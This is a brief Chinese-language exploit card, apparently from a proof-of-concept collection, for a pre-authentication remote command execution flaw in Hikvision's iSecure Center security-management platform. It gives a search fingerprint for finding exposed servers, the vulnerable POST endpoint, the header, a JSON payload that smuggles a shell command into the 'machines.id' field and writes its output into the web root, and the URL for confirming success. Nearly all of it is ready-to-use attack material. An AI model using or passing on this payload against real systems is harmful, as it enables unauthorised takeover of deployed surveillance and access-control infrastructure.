# 海康威视综合安防管理平台detection前台RCE漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="HIKVISION-iSecure-Center"`
- **请求**：`POST /center/api/installation/detection HTTP/1.1`
- **关键头**：`Content-Type: application/json;charset=UTF-8`

**请求体 / payload**
```
{"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}
验证url
/vms/static/1.txt
```
- **预期**：200　|　“code”: